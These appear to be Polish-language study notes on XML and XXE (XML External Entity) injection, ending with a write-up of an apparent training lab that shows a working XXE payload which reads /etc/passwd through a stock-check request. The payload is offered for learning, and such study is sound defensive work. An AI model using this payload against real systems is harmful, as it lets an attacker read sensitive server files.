XML to prosty format tekstowy służący do przechowywania i wymiany danych w uporządkowanej (tagowanej) formie.

XXE (XML External Entity) to podatność bezpieczeństwa, w której parser XML pozwala na wczytanie zewnętrznych danych (np. plików z systemu), co atakujący może wykorzystać do kradzieży informacji lub ataku.

📦 Przykład:

```
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
```
XML mówi: „hej parserze, weź dane z innego miejsca”
to „inne miejsce” to właśnie external entity

🧠 Czyli:
dla OS: /etc/passwd → wewnętrzny plik
dla XML parsera: /etc/passwd → zewnętrzne źródło danych

🔥 Najprostsza definicja (pentesterska):
External = poza XML-em, nie poza systemem

Dlatego:
file:///etc/passwd → external entity (lokalny plik)
http://127.0.0.1 → external entity (sieć)
ftp://... → też external

<br><br>
<hr>
<br><br>
<h2>Lab: Exploiting XXE using external entities to retrieve files</h2>

 This lab has a "Check stock" feature that parses XML input and returns any unexpected values in the response. 

 original:

 ```
<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId>3</storeId></stockCheck>
```

payload:

```
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><stockCheck><productId>&xxe;</productId><storeId>3</storeId></stockCheck>
```



 <img width="1200" height="602" alt="image" src="https://github.com/user-attachments/assets/1c37d999-3ef4-43ae-a413-8b89dd6524a8" />


<img width="1199" height="646" alt="image" src="https://github.com/user-attachments/assets/aa660ba5-5031-4729-8ee2-3e63c18d1d94" />

